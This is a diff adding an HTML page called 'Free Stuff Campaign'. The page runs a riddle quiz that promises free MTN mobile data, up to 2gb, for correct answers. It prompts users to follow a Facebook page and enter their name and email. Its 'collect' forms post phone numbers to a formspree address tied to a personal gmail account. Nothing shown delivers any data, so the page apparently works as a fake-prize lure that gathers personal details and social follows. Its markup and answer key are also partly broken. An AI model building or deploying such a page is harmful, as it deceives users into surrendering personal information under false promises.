@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html >
+<head>
+<title>Campaign</title>
+<style type="text/css">
+header {text-align :center ;
+
+}
+
+body {margin :20px auto;
+}
+
+h1 {background :#3399ff;
+    color :#9999;
+}
+
+.submit {text-align :center ;
+       }
+
+.ins {display :none;
+}
+
+.spon {text-align :center ;
+       padding :10%;
+}
+
+.disabled {cursor: not-allowed;
+        pointer-events: none;
+        color: #c0c0c0;
+        background-color: #ffffff;
+}
+
+.question {display :none;
+}
+
+h5 {display :none;
+}
+
+.all {border :20px #3399ff;
+      display :initial;
+      border-radius :15px;
+      with :60%;
+      height :60%;
+}
+
+.collect {float :right;
+}
+
+.info {float :left;
+       display :inline-block;
+       margin :10px 0 10px;
+}
+.numb {display :none;
+}
+.data {display :none;
+}
+</style>
+</head>
+<body>
+<header >
+<h1>Free Stuff Campaign</h1>
+</header>
+<h5 class ="all" Id ="lot">
+<div class ="spon" data-action ="like">
+<!-- Sponsores Facebook page-->
+<img src="https://1.bp.blogspot.com/-76hG5uj3sqA/WFw9QIvoAmI/AAAAAAAAAnU/pqFs2kmXQ4Y7EqfIZCpp1PjwXbKDJQszwCLcB/s320/PicsArt_11-19-11.44.36.png" width ="100" height ="100"><br>
+
+<div onclick ="disabled()" class="fb-follow" data-href="https://www.facebook.com/hiswordxray" data-layout="standard" data-size="small"></div>
+</div>
+ 
+<!-- User Details-->
+<p>Name:   <input type= "text " placeholder ="first name"></p>
+<p>Email:  <input type ="text" placeholder ="example@gmail.com"> </p>
+
+<!-- Questions -->
+<div >
+<p><strong >1. What goes up when rain comes down</strong></li> <br>
+<label><input type="radio" name="myCheck"  value ="vap" > Vapor</label> <br>
+<label><input type ="radio" name="myCheck" value ="res" > Respiration </label><br>
+<label><input type ="radio" name="myCheck" value ="umb" Id ="correct"> Umbrella</label> <br>
+</p>
+
+<!--Submit Button and hidden Next Button --> 
+<div class ="submit">
+<button class ="disabled" Id ="submit" type ="button"><b>Submit</b> </button><br>
+</div>
+</div>
+</h5>
+
+<div class ="question" Id="qut1">
+<b>2. “The attorney is my brother,” testified the accountant. But the attorney testified he did not have a brother. Who is lying?</b><br>
+<input type="radio" name="qut1" >The attorney <br>
+<input type ="radio" name="qut1" Id ="cor1" >None of them<br>
+<input type ="radio" name="qut1">The accountant<br>
+<input type ="radio" name="qut1">Both of them<br>
+<button Id ="sub1">Submit </button>
+</div>
+
+<div class="question" Id ="qut2">
+<b>3. Some months have 31 days, others have 30 days, but how many have 28 days?</b><br>
+<input type="radio" Id ="cor2">All<br>
+<input type ="radio" name="qut2">3<br>
+<input type ="radio" name="qut2">1 <br>
+<input type ="radio" name="qut2">None <br>
+<button class ="subgone" Id ="sub2">Submit </button>
+</div>
+
+<div class="question" Id ="qut3">
+<b>4. How was it possible that every single person in an airplane crash died, but two people survived?</b><br>
+<input name="qut3" type="radio">The two can fly</label> <br>
+<input name="qut3" type ="radio">The two had parachute</label><br>
+<input name="qut3" type ="radio" Id ="cor3">The two are married</label> <br>
+<input name="qut3" type ="radio">The two left never entered the plane</label> <br>
+<button class ="subgone" Id ="sub3">Submit </button>
+</div>
+
+
+<div class="question" Id ="qut4">
+<b>5. How did the boy kick his soccer ball ten feet, and then have it come back to him on its own?</b><br>
+<input type="radio" name="qut4">His dog brought it back</label> <br>
+<input type ="radio" name="qut4">He never kicked it</label><br>
+<input type ="radio" name="qut4" Id ="cor4">He kicked it up</label> <br>
+<input type ="radio" name="qut4">He kicked it against a wall</label> <br>
+<button class ="subgone" Id ="sub4">Submit </button>
+</div>
+
+<div class="question" Id ="qut5">
+<b>6. If an electric train is moving north at 100mph and a wind is blowing to the west at 10mph, which way does the smoke blow?</b><br>
+<input type="radio" name="qut5">anywhere<br>
+<input type ="radio" name="qit5">east<br>
+<input type ="radio" name="qut5" >west<br>
+<input type ="radio" name="qut5" Id ="cor5">nowhere <br>
+<button class ="subgone" Id ="sub5">Submit </button>
+</div>
+
+<div class="question" Id ="qut6">
+<b>7. What gets wetter & wetter the more it dries?</b><br>
+<input type="radio" name="qut6" Id ="cor6">towel <br>
+<input type ="radio" name="qut6">waterfall<br>
+<input type ="radio" name="qut6">rain <br>
+<input type ="radio" name="qut6">sponge<br>
+<button class ="subgone" Id ="sub6">Submit </button>
+</div>
+
+<div class="question" Id ="qut7">
+<b>8. Which tree can you carry with your hands?</b><br>
+<input type="radio" name="qut7" >coconut tree <br>
+<input type ="radio" name="qut7" Id ="cor7">palm tree<br>
+<input type ="radio" name="qut7">flower<br>
+<input type ="radio" name="qut7">pepper<br>
+<button class ="subgone" Id ="sub7">Submit</button>
+</div>
+
+<div class ="info">
+<button Id ="insBut">Instructions</button>
+<p Id ="ins" class ="ins">
+You have 8 questions. You win free<br>
+data for each one answered correctly<br>
+But you can only collect the data when<br>
+you have won up to 250mb,1gb and 2gb.<br>
+When you've reach these thresholds the<br>
+button would be activated and then you<br>
+can click to collect your free data.<br>
+Once you've clicked the collect button<br>
+you would receive your data within<br>
+12 hours
+</p>
+</div>
+
+
+<div class ="collect">
+<form action="https://formspree.io/hiswordxray@gmail.com"
+      method="POST">
+<input name ="number" type ="text" class ="numb" placeholder ="phone number" Id="num1">
+<input name ="data " class ="data" type ="text" Id ="data1">
+<input class = "disabled" Id ="250mb" type="submit" value="Collect 250mb">
+</form>
+
+<form action="https://formspree.io/hiswordxray@gmail.com"
+      method="POST">
+<input name ="number" type ="text" class ="numb" placeholder ="phone number" Id="num2">
+<input name ="data " class ="data" type ="text" Id ="data2">
+<input class = "disabled" Id = "call1gb" type ="submit" value="Collect 1gb">
+</form>
+
+<form action="https://formspree.io/hiswordxray@gmail.com"
+      method="POST">
+<input name ="number" type ="text" class ="numb" placeholder ="phone number" Id="num3">
+<input name ="data" class ="data" type ="text" Id ="data3">
+<input class ="disabled" Id = "call2gb" type ="submit" value="Collect 2gb">
+</form>
+</div>
+<script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+
+<script type="text/javascript">
+document.getElementById("data2").value = "to collect 1gb";
+document.getElementById("data1").value = "to collect 250mb";
+document.getElementById("data3").value = "to collect 2gb";  
+var submit = document.getElementById("submit");
+var next = document.getElementById("qut1");
+var sub1 = document.getElementById("sub1");
+var sub2 = document.getElementById("sub2");
+var sub3 = document.getElementById("sub3");
+var sub4 = document.getElementById("sub4");
+var sub5 = document.getElementById("sub5");
+var sub6 = document.getElementById("sub6");
+var sub7 = document.getElementById("sub7");
+
+var qut2 = document.getElementById("qut2");
+var qut3 = document.getElementById("qut3");
+var qut4 = document.getElementById("qut4");
+var qut5 = document.getElementById("qut5");
+var qut6 = document.getElementById("qut6");
+var qut7 = document.getElementById("qut7");
+
+submit.addEventListener("click", function (){
+document.getElementById("lot").className="";
+if (document.getElementById("correct").checked){
+alert ("Correct! You have won 50mb");
+next.className = "";
+} else {
+alert ("Sorry, you are incorrect.");
+}
+});
+
+function disabled(){
+if (submit.className === "disabled") {
+    submit.className  = "";
+} else {
+    submit.className  = "disabled";
+}
+};
+
+sub1.addEventListener("click", function (){
+next.className = "question";
+if (document.getElementById("cor1").checked){
+qut2.className= "";
+alert("Correct! You have won 200mb" );
+
+} else { alert("Sorry, you are incorrect.");
+}
+});
+
+sub2.addEventListener("click", function (){
+qut2.className = "question";
+if (document.getElementById("cor2").checked){
+alert("Correct! You have won 450mb and you can now redeem it l");
+qut3.className= "";
+document.getElementById("250mb").className = "";
+document.getElementById("num1").className = "";
+} else { alert("Sorry, you are incorrect.");
+}
+});
+
+sub3.addEventListener("click", function (){
+document.getElementById("qut3").style.display="none";
+if (document.getElementById("cor3").checked){
+alert("Correct! You have won 700mb");
+qut4.className= "";
+} else { alert("Sorry, you are incorrect.");
+}
+});
+
+sub4.addEventListener("click", function (){
+document.getElementById("qut4").style.display="none";
+if (document.getElementById("cor4").checked){
+alert("Correct! You have won 1250mb");
+qut5.className= "";
+document.getElementById("250mb").className = "disabled";
+document.getElementById("call1gb").className = "";
+document.getElementById("num1").className = "numb";
+document.getElementById("num2").className = "";
+} else { alert("Sorry, you are incorrect.");
+}
+});
+
+sub5.addEventListener("click", function (){
+document.getElementById("qut5").style.display="none";
+if (document.getElementById("cor5").checked){
+alert("Correct! You have won 1700mb");
+qut6.className= "";
+} else { alert("Sorry, you are incorrect.");
+}
+});
+
+sub6.addEventListener("click", function (){
+document.getElementById("qut6").style.display="none";
+if (document.getElementById("cor6").checked){
+alert("Correct! You have won 2150mb");
+qut7.className= "";
+} else { alert("Sorry, you are incorrect.");
+}
+});
+
+sub7.addEventListener("click", function(){
+if (document.getElementById("cor7").checked){
+alert("Congratulation, you have won free 2gb MTN data");
+document.getElementById("call1gb").className = "disabled";
+document.getElementById("call2gb").className = "";
+document.getElementById("num2").className = "";
+document.getElementById("num3").className = "";
+} else {alert("Incorrect, but at least you have gotten this far."); 
+}
+});
+
+$("#insBut").on("click", function(){
+$("#ins").toggle();
+});
+</script>
+<b:if cond='data:blog.pageType == &quot;item&quot;'> 
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = 'https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.11';
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script> 
+</b:if>
+</body>
+</html>
